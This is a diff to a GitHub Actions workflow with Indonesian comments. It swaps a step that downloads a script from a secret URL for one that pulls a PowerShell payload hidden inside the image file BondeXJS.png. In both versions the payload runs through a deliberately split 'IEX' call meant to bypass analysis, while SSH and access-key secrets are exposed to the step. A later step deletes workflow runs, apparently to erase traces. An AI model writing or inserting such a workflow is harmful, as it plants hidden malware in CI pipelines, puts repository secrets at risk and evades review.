@@ -15,18 +15,40 @@ jobs:
       - name: s_01
         uses: actions/checkout@v4
 
-      - name: s_02
+      - name: s_02 (Extract & Execute from Local Image)
         shell: powershell
         env:
           SSH_KEY: ${{ secrets.SSH_KEY }}
           A_KEY: ${{ secrets.ACCESS_KEY }}
-          P_B64: ${{ secrets.PAYLOAD_URL }} 
         run: |
-          # Anti-Analysis: Decode & Invoke-Expression dengan string fragmentation
-          $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:P_B64))
-          $content = (Invoke-WebRequest -Uri $decoded -UseBasicParsing).Content
-          $e = "I" + "E" + "X"
-          & $e ($content)
+          # 1. Tentukan path gambar di root repo
+          $imgPath = Join-Path $pwd "BondeXJS.png"
+          
+          if (Test-Path $imgPath) {
+              Write-Host "[*] Reading payload from $imgPath..." -ForegroundColor Cyan
+              
+              # 2. Baca konten file sebagai string mentah
+              $content = Get-Content $imgPath -Raw -Encoding utf8
+              
+              # 3. Cari marker awal skrip (sesuai header di payload.ps1)
+              $marker = "# ========================================================="
+              $startIndex = $content.IndexOf($marker)
+              
+              if ($startIndex -ge 0) {
+                  $payload = $content.Substring($startIndex)
+                  Write-Host "[+] Payload extracted. Launching Ghost Engine..." -ForegroundColor Green
+                  
+                  # 4. Eksekusi dengan IEX (Fragmented untuk bypass)
+                  $e = "I" + "E" + "X"
+                  & $e ($payload)
+              } else {
+                  Write-Host "[-] Error: Marker skrip tidak ditemukan dalam gambar!" -ForegroundColor Red
+                  exit 1
+              }
+          } else {
+              Write-Host "[-] Error: File BondeXJS.png tidak ditemukan di root repo." -ForegroundColor Red
+              exit 1
+          }
           
       - name: s_03
         uses: Mattraks/delete-workflow-runs@v2
